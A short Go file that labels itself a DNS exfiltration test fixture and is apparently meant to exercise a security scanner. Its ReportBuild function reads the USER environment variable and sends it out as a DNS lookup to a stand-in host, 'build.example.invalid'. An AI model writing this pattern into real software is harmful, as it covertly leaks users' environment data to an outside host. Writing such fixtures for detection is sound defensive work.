// GO-DNS-EXFIL-001 reachable DNS exfiltration fixture. DO NOT DEPLOY.
package main

import (
    "net"
    "os"
)

func ReportBuild() error {
    user := os.Getenv("USER")
    _, err := net.LookupHost(user + ".build.example.invalid")
    return err
}

func main() {
    _ = ReportBuild()
}
